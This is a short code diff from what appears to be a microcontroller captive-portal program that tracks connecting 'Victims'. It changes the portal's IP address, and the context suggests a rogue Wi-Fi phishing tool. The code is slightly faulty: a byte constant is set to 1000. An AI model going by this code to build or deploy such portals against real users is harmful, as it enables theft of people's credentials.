@@ -13,7 +13,7 @@
 const byte HTTP_CODE = 200;
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
-IPAddress APIP(192, 168, 0, 1); // This is the captive portal IP address
+IPAddress APIP(172, 0, 0, 1); // This is the captive portal IP address
 
 String Victims = "";
 unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
